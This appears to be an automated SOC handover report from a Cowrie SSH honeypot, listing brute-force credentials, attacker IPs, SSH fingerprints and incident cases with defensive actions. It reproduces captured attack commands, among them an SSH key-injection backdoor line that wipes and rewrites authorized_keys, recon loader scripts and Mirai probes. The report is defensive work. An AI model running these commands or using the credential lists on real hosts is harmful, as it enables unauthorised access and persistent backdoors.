# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-30 |
| **Generated At** | 2026-06-30T18:01:05Z |
| **Shift Time** | 18:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **294** |
| Confirmed Threats | **287** |
| False Positives Filtered | **7** (2.4%) |
| Unique Attacker IPs | **82** |
| Countries of Origin | **27** |
| High Severity Cases | **171** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **123** |
| Malware Samples Analyzed | **5** HIGH · **40** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **206** |
| Unique Credential Pairs | **126** |
| Unique Usernames | **32** |
| Unique Passwords | **103** |
| Successful Auth Pairs | **187** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 104 |
| `345gs5662d34` | 41 |
| `ubuntu` | 8 |
| `admin` | 3 |
| `dis` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 41 |
| `3245gs5662d34` | 41 |
| `123456` | 6 |
| `LeitboGi0ro` | 4 |
| `123@@@` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 41 |
| `root` | `3245gs5662d34` | 25 |
| `root` | `LeitboGi0ro` | 4 |
| `root` | `123@@@` | 4 |
| `dis` | `1` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1234567890` | `195.178.110.228` | 2026-06-30T12:55:40 |
| `root` | `123qwe` | `195.178.110.228` | 2026-06-30T12:58:42 |
| `liweixiao` | `liweixiao` | `45.198.224.120` | 2026-06-30T13:00:28 |
| `root` | `123qwerty` | `195.178.110.228` | 2026-06-30T13:02:42 |
| `root` | `Ac@123456` | `10.0.0.73` | 2026-06-30T13:05:29 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-06-30T13:05:31 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T13:05:31 |
| `root` | `aa102030` | `10.0.0.73` | 2026-06-30T13:05:42 |
| `root` | `Qh@123456` | `103.153.110.190` | 2026-06-30T13:07:18 |
| `345gs5662d34` | `345gs5662d34` | `103.153.110.190` | 2026-06-30T13:07:22 |
| `root` | `3245gs5662d34` | `103.153.110.190` | 2026-06-30T13:07:24 |
| `root` | `21` | `195.178.110.228` | 2026-06-30T13:07:25 |
| `root` | `qweasd!@#` | `45.205.1.42` | 2026-06-30T13:08:20 |
| `root` | `qwer123.com` | `185.242.3.195` | 2026-06-30T13:11:43 |
| `root` | `12341234` | `45.198.224.120` | 2026-06-30T13:11:59 |
| `root` | `iptv` | `220.80.223.144` | 2026-06-30T13:12:37 |
| `345gs5662d34` | `345gs5662d34` | `220.80.223.144` | 2026-06-30T13:12:41 |
| `root` | `3245gs5662d34` | `220.80.223.144` | 2026-06-30T13:12:42 |
| `root` | `321` | `195.178.110.228` | 2026-06-30T13:12:50 |
| `root` | `123456qaZ` | `36.50.151.66` | 2026-06-30T13:14:09 |
| `345gs5662d34` | `345gs5662d34` | `36.50.151.66` | 2026-06-30T13:14:13 |
| `root` | `3245gs5662d34` | `36.50.151.66` | 2026-06-30T13:14:14 |
| `root` | `qwer123.com` | `10.0.0.73` | 2026-06-30T13:15:32 |
| `admin` | `Admin@2025` | `198.98.62.211` | 2026-06-30T13:17:45 |
| `345gs5662d34` | `345gs5662d34` | `198.98.62.211` | 2026-06-30T13:17:46 |
| `admin` | `3245gs5662d34` | `198.98.62.211` | 2026-06-30T13:17:46 |
| `root` | `﻿------fuck------` | `43.100.50.217` | 2026-06-30T13:18:32 |
| `root` | `4321` | `195.178.110.228` | 2026-06-30T13:18:35 |
| `root` | `vm@123456` | `45.232.73.84` | 2026-06-30T13:19:24 |
| `345gs5662d34` | `345gs5662d34` | `45.232.73.84` | 2026-06-30T13:19:27 |
| `root` | `3245gs5662d34` | `45.232.73.84` | 2026-06-30T13:19:28 |
| `root` | `tp123456` | `138.124.69.150` | 2026-06-30T13:19:39 |
| `345gs5662d34` | `345gs5662d34` | `138.124.69.150` | 2026-06-30T13:19:42 |
| `root` | `3245gs5662d34` | `138.124.69.150` | 2026-06-30T13:19:42 |
| `batman` | `batman` | `45.198.224.120` | 2026-06-30T13:23:28 |
| `usuario1` | `123456` | `45.205.1.42` | 2026-06-30T13:24:54 |
| `root` | `Demo123456` | `10.0.0.73` | 2026-06-30T13:25:00 |
| `root` | `54321` | `195.178.110.228` | 2026-06-30T13:25:31 |
| `root` | `hs@123456` | `197.153.57.103` | 2026-06-30T13:31:02 |
| `345gs5662d34` | `345gs5662d34` | `197.153.57.103` | 2026-06-30T13:31:05 |
| `root` | `3245gs5662d34` | `197.153.57.103` | 2026-06-30T13:31:06 |
| `root` | `654321` | `195.178.110.228` | 2026-06-30T13:32:16 |
| `root` | `P@ssword01` | `45.198.224.120` | 2026-06-30T13:34:44 |
| `montreal` | `montreal` | `10.0.0.73` | 2026-06-30T13:34:53 |
| `montreal` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T13:34:54 |
| `root` | `P4ssw0rd` | `195.178.110.228` | 2026-06-30T13:39:31 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.205.202.250` | 2026-06-30T13:39:48 |
| `*1` | `$4` | `35.205.202.250` | 2026-06-30T13:40:01 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 3359` | `35.205.202.250` | 2026-06-30T13:40:03 |
| `ubuntu` | `ubunturoot` | `45.205.1.42` | 2026-06-30T13:41:30 |
| `geb` | `geb` | `134.112.56.47` | 2026-06-30T13:42:04 |
| `345gs5662d34` | `345gs5662d34` | `134.112.56.47` | 2026-06-30T13:42:07 |
| `geb` | `3245gs5662d34` | `134.112.56.47` | 2026-06-30T13:42:08 |
| `sie` | `123456` | `98.71.8.129` | 2026-06-30T13:44:13 |
| `345gs5662d34` | `345gs5662d34` | `98.71.8.129` | 2026-06-30T13:44:15 |
| `sie` | `3245gs5662d34` | `98.71.8.129` | 2026-06-30T13:44:16 |
| `ubuntu` | `abcdpass` | `45.198.224.120` | 2026-06-30T13:45:57 |
| `root` | `P4ssword` | `195.178.110.228` | 2026-06-30T13:46:39 |
| `admin` | `admin` | `104.155.77.148` | 2026-06-30T13:47:14 |
| `root` | `ABCabc` | `14.224.227.189` | 2026-06-30T13:47:48 |
| `345gs5662d34` | `345gs5662d34` | `14.224.227.189` | 2026-06-30T13:47:52 |
| `root` | `3245gs5662d34` | `14.224.227.189` | 2026-06-30T13:47:53 |
| `root` | `Admin123!` | `120.48.26.185` | 2026-06-30T13:47:55 |
| `root` | `somepass` | `49.207.40.162` | 2026-06-30T13:49:22 |
| `345gs5662d34` | `345gs5662d34` | `49.207.40.162` | 2026-06-30T13:49:26 |
| `root` | `3245gs5662d34` | `49.207.40.162` | 2026-06-30T13:49:28 |
| `root` | `P@ssw0rd` | `195.178.110.228` | 2026-06-30T13:52:48 |
| `root` | `quiet` | `45.198.224.120` | 2026-06-30T13:57:30 |
| `root` | `qwe123.` | `45.205.1.42` | 2026-06-30T13:57:39 |
| `root` | `Passw0rd` | `195.178.110.228` | 2026-06-30T13:59:31 |
| `root` | `p4ssword` | `195.178.110.228` | 2026-06-30T14:05:13 |
| `dis` | `1` | `185.242.3.195` | 2026-06-30T14:07:00 |
| `root` | `Pass@word123$` | `45.198.224.120` | 2026-06-30T14:09:16 |
| `root` | `p@ssw0rd` | `195.178.110.228` | 2026-06-30T14:10:24 |
| `root` | `evite` | `45.205.1.42` | 2026-06-30T14:14:04 |
| `root` | `passw0rd` | `195.178.110.228` | 2026-06-30T14:15:58 |
| `ubuntu` | `12345x` | `45.198.224.120` | 2026-06-30T14:20:51 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.53.135.16` | 2026-06-30T14:21:27 |
| `*1` | `$4` | `34.53.135.16` | 2026-06-30T14:21:41 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 6084` | `34.53.135.16` | 2026-06-30T14:21:43 |
| `root` | `` | `94.154.43.10` | 2026-06-30T14:26:43 |
| `client` | `Client123` | `45.205.1.42` | 2026-06-30T14:30:36 |
| `nagios` | `nag10s` | `45.198.224.120` | 2026-06-30T14:33:03 |
| `root` | `Asdfg!123456` | `191.7.26.153` | 2026-06-30T14:34:57 |
| `345gs5662d34` | `345gs5662d34` | `191.7.26.153` | 2026-06-30T14:35:00 |
| `root` | `3245gs5662d34` | `191.7.26.153` | 2026-06-30T14:35:01 |
| `root` | `pASSW0Rd` | `102.223.92.101` | 2026-06-30T14:37:59 |
| `345gs5662d34` | `345gs5662d34` | `102.223.92.101` | 2026-06-30T14:38:04 |
| `root` | `3245gs5662d34` | `102.223.92.101` | 2026-06-30T14:38:06 |
| `root` | `Asdfg!123456` | `223.123.124.70` | 2026-06-30T14:38:12 |
| `345gs5662d34` | `345gs5662d34` | `223.123.124.70` | 2026-06-30T14:38:16 |
| `root` | `3245gs5662d34` | `223.123.124.70` | 2026-06-30T14:38:18 |
| `root` | `P455wORd` | `10.0.0.73` | 2026-06-30T14:41:17 |
| `user` | `4444` | `20.116.34.103` | 2026-06-30T14:41:54 |
| `345gs5662d34` | `345gs5662d34` | `20.116.34.103` | 2026-06-30T14:41:55 |
| `user` | `3245gs5662d34` | `20.116.34.103` | 2026-06-30T14:41:55 |
| `root` | `woaini520...` | `174.35.25.179` | 2026-06-30T14:42:09 |
| `345gs5662d34` | `345gs5662d34` | `174.35.25.179` | 2026-06-30T14:42:10 |
| `root` | `3245gs5662d34` | `174.35.25.179` | 2026-06-30T14:42:11 |
| `root` | `zxc123..` | `10.0.0.73` | 2026-06-30T14:43:22 |
| `ubuntu` | `P@ssw0rd123` | `45.198.224.120` | 2026-06-30T14:44:53 |
| `root` | `1q2w3e4` | `45.205.1.42` | 2026-06-30T14:47:13 |
| `root` | `Qwert!123456` | `10.0.0.73` | 2026-06-30T14:47:20 |
| `dis` | `1` | `10.0.0.73` | 2026-06-30T14:47:22 |
| `root` | `shopping` | `45.198.224.120` | 2026-06-30T14:56:57 |
| `test` | `123456` | `45.205.1.42` | 2026-06-30T15:04:06 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-06-30T15:07:45 |
| `root` | `123@@@` | `129.153.145.135` | 2026-06-30T15:07:45 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-06-30T15:07:50 |
| `root` | `Qwer1` | `45.198.224.120` | 2026-06-30T15:09:24 |
| `parana` | `parana` | `203.130.11.3` | 2026-06-30T15:10:20 |
| `345gs5662d34` | `345gs5662d34` | `203.130.11.3` | 2026-06-30T15:10:23 |
| `parana` | `3245gs5662d34` | `203.130.11.3` | 2026-06-30T15:10:25 |
| `hall` | `hall123` | `36.93.144.67` | 2026-06-30T15:17:06 |
| `345gs5662d34` | `345gs5662d34` | `36.93.144.67` | 2026-06-30T15:17:10 |
| `hall` | `3245gs5662d34` | `36.93.144.67` | 2026-06-30T15:17:12 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-06-30T15:20:01 |
| `root` | `123@@@` | `144.22.238.238` | 2026-06-30T15:20:02 |
| `root` | `P@ssword123!` | `45.205.1.42` | 2026-06-30T15:20:30 |
| `user` | `1234` | `45.198.224.120` | 2026-06-30T15:21:35 |
| `root` | `asdfghjkl2024` | `46.101.77.4` | 2026-06-30T15:25:35 |
| `345gs5662d34` | `345gs5662d34` | `46.101.77.4` | 2026-06-30T15:25:37 |
| `root` | `3245gs5662d34` | `46.101.77.4` | 2026-06-30T15:25:38 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-06-30T15:27:56 |
| `root` | `Root@1qazXSW@` | `117.218.75.251` | 2026-06-30T15:29:26 |
| `345gs5662d34` | `345gs5662d34` | `117.218.75.251` | 2026-06-30T15:29:30 |
| `root` | `3245gs5662d34` | `117.218.75.251` | 2026-06-30T15:29:32 |
| `root` | `asdasd` | `45.198.224.120` | 2026-06-30T15:34:04 |
| `lighthouse` | `lighthouse@2026` | `118.196.119.108` | 2026-06-30T15:35:35 |
| `git` | `test123` | `139.59.208.225` | 2026-06-30T15:36:32 |
| `345gs5662d34` | `345gs5662d34` | `139.59.208.225` | 2026-06-30T15:36:35 |
| `git` | `3245gs5662d34` | `139.59.208.225` | 2026-06-30T15:36:35 |
| `nagios` | `P4ssw0rd` | `45.205.1.42` | 2026-06-30T15:36:52 |
| `root` | `webadmin` | `185.242.3.195` | 2026-06-30T15:38:35 |
| `ubuntu` | `Admin@2024!` | `45.198.224.120` | 2026-06-30T15:45:51 |
| `root` | `Smart@123` | `151.60.88.74` | 2026-06-30T15:50:39 |
| `345gs5662d34` | `345gs5662d34` | `151.60.88.74` | 2026-06-30T15:50:41 |
| `root` | `3245gs5662d34` | `151.60.88.74` | 2026-06-30T15:50:42 |
| `root` | `Admin.1234` | `139.59.18.80` | 2026-06-30T15:51:14 |
| `345gs5662d34` | `345gs5662d34` | `139.59.18.80` | 2026-06-30T15:51:18 |
| `root` | `3245gs5662d34` | `139.59.18.80` | 2026-06-30T15:51:19 |
| `testuser` | `testuser123` | `45.205.1.42` | 2026-06-30T15:53:20 |
| `root` | `qweewq123` | `14.103.117.116` | 2026-06-30T15:56:52 |
| `345gs5662d34` | `345gs5662d34` | `14.103.117.116` | 2026-06-30T15:56:58 |
| `root` | `3245gs5662d34` | `14.103.117.116` | 2026-06-30T15:56:59 |
| `root` | `geronimo` | `45.198.224.120` | 2026-06-30T15:57:52 |
| `root` | `123@@@` | `64.110.90.250` | 2026-06-30T15:58:16 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-06-30T15:58:16 |
| `root` | `﻿------fuck------` | `106.74.128.226` | 2026-06-30T15:59:18 |
| `ops` | `ops123` | `1.192.61.19` | 2026-06-30T16:03:31 |
| `345gs5662d34` | `345gs5662d34` | `1.192.61.19` | 2026-06-30T16:03:36 |
| `ops` | `3245gs5662d34` | `1.192.61.19` | 2026-06-30T16:03:38 |
| `medical` | `medical` | `118.196.119.108` | 2026-06-30T16:06:19 |
| `exchange` | `exchange123` | `51.91.157.92` | 2026-06-30T16:08:09 |
| `345gs5662d34` | `345gs5662d34` | `51.91.157.92` | 2026-06-30T16:08:11 |
| `exchange` | `3245gs5662d34` | `51.91.157.92` | 2026-06-30T16:08:12 |
| `michelle` | `michelle` | `45.198.224.120` | 2026-06-30T16:09:41 |
| `genius` | `123456` | `103.97.135.244` | 2026-06-30T16:09:45 |
| `345gs5662d34` | `345gs5662d34` | `103.97.135.244` | 2026-06-30T16:09:49 |
| `genius` | `3245gs5662d34` | `103.97.135.244` | 2026-06-30T16:09:51 |
| `root` | `Root@12345678` | `45.205.1.42` | 2026-06-30T16:10:07 |
| `webcalendar` | `webcalendar` | `187.230.85.160` | 2026-06-30T16:17:44 |
| `345gs5662d34` | `345gs5662d34` | `187.230.85.160` | 2026-06-30T16:17:46 |
| `webcalendar` | `3245gs5662d34` | `187.230.85.160` | 2026-06-30T16:17:47 |
| `root` | `admin.2025` | `103.67.80.61` | 2026-06-30T16:19:15 |
| `root` | `webadmin` | `10.0.0.73` | 2026-06-30T16:19:17 |
| `345gs5662d34` | `345gs5662d34` | `103.67.80.61` | 2026-06-30T16:19:19 |
| `root` | `3245gs5662d34` | `103.67.80.61` | 2026-06-30T16:19:21 |
| `root` | `password1` | `45.198.224.120` | 2026-06-30T16:20:49 |
| `root` | `abc123!!` | `14.103.123.80` | 2026-06-30T16:21:57 |
| `root` | `Abcd@2026` | `186.96.158.180` | 2026-06-30T16:22:43 |
| `345gs5662d34` | `345gs5662d34` | `186.96.158.180` | 2026-06-30T16:22:45 |
| `root` | `3245gs5662d34` | `186.96.158.180` | 2026-06-30T16:22:46 |
| `ubuntu` | `1qaz@WSX` | `45.205.1.42` | 2026-06-30T16:26:42 |
| `user12` | `user12` | `190.32.246.14` | 2026-06-30T16:27:07 |
| `345gs5662d34` | `345gs5662d34` | `190.32.246.14` | 2026-06-30T16:27:09 |
| `user12` | `3245gs5662d34` | `190.32.246.14` | 2026-06-30T16:27:10 |
| `git` | `123456` | `45.198.224.120` | 2026-06-30T16:32:22 |
| `ocw` | `123456` | `10.0.0.73` | 2026-06-30T16:37:28 |
| `ocw` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T16:37:33 |
| `root` | `Root123!` | `45.205.1.42` | 2026-06-30T16:42:42 |
| `root` | `P@ss@123456` | `45.198.224.120` | 2026-06-30T16:44:21 |
| `root` | `090909` | `10.0.0.73` | 2026-06-30T16:46:57 |
| `ubuntu` | `qwaszx` | `10.0.0.73` | 2026-06-30T16:47:00 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T16:47:05 |
| `ftp_user` | `1234` | `10.0.0.73` | 2026-06-30T16:48:50 |
| `ftp_user` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T16:48:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **294** |
| Sessions with Fingerprint | **17** |
| Unique HASSH Fingerprints | **17** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 109 |
| Go SSH scanner | 59 |
| Paramiko (Python) | 10 |
| Nmap scanner | 7 |
| PuTTY | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 94 | 35 |
| `16443846184e...` | Generic scanner | 39 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 15 | 1 |
| `a2de0f306611...` | Mirai/variant | 10 | 3 |
| `af8223ac9914...` | libssh-based | 7 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 94 | 35 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 39 | 3 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 15 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `af8223ac9914...` | libssh | 7 | 3 | libssh-based |
| `95420f9d932d...` | libssh | 6 | 4 | — |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `5bd26477da54...` | PuTTY | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 15 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 32 | 32 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.10`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `197.153.57.103`, `103.97.135.244`, `186.96.158.180`, `138.124.69.150`, `49.207.40.162`, `118.196.119.108`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **82** |
| Unique ASNs | **52** |
| High-Risk ASNs | **51** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 6 | HIGH |
| `AS14061` | DigitalOcean, LLC | 6 | HIGH |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (171)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ac3356ea7068

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 12:55 |
| **Last Seen** | 2026-06-30 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:55:39` | `cowrie.session.connect` |
| `2026-06-30 12:55:39` | `cowrie.client.version` |
| `2026-06-30 12:55:39` | `cowrie.client.kex` |
| `2026-06-30 12:55:40` | `cowrie.login.success` |
| `2026-06-30 12:55:41` | `cowrie.session.params` |
| `2026-06-30 12:55:41` | `cowrie.command.input` |
| `2026-06-30 12:55:41` | `cowrie.command.input` |
| `2026-06-30 12:55:41` | `cowrie.command.input` |
| `2026-06-30 12:55:41` | `cowrie.command.input` |
| `2026-06-30 12:55:41` | `cowrie.command.input` |
| `2026-06-30 12:55:41` | `cowrie.command.success` |
| `2026-06-30 12:55:41` | `cowrie.command.input` |
| `2026-06-30 12:55:41` | `cowrie.command.input` |
| `2026-06-30 12:55:41` | `cowrie.command.input` |
| `2026-06-30 12:55:41` | `cowrie.command.input` |
| `2026-06-30 12:55:41` | `cowrie.log.closed` |
| `2026-06-30 12:55:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f744b62f232

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 12:58 |
| **Last Seen** | 2026-06-30 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:58:42` | `cowrie.session.connect` |
| `2026-06-30 12:58:42` | `cowrie.client.version` |
| `2026-06-30 12:58:42` | `cowrie.client.kex` |
| `2026-06-30 12:58:42` | `cowrie.login.success` |
| `2026-06-30 12:58:43` | `cowrie.session.params` |
| `2026-06-30 12:58:43` | `cowrie.command.input` |
| `2026-06-30 12:58:43` | `cowrie.command.input` |
| `2026-06-30 12:58:43` | `cowrie.command.input` |
| `2026-06-30 12:58:43` | `cowrie.command.input` |
| `2026-06-30 12:58:43` | `cowrie.command.input` |
| `2026-06-30 12:58:43` | `cowrie.command.success` |
| `2026-06-30 12:58:43` | `cowrie.command.input` |
| `2026-06-30 12:58:43` | `cowrie.command.input` |
| `2026-06-30 12:58:43` | `cowrie.command.input` |
| `2026-06-30 12:58:43` | `cowrie.command.input` |
| `2026-06-30 12:58:43` | `cowrie.log.closed` |
| `2026-06-30 12:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30ff19a20ef1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 13:00 |
| **Last Seen** | 2026-06-30 13:00 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:00:20` | `cowrie.session.connect` |
| `2026-06-30 13:00:22` | `cowrie.client.version` |
| `2026-06-30 13:00:22` | `cowrie.client.kex` |
| `2026-06-30 13:00:28` | `cowrie.login.success` |
| `2026-06-30 13:00:32` | `cowrie.session.params` |
| `2026-06-30 13:00:32` | `cowrie.command.input` |
| `2026-06-30 13:00:33` | `cowrie.log.closed` |
| `2026-06-30 13:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aef7983908ce

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 13:02 |
| **Last Seen** | 2026-06-30 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

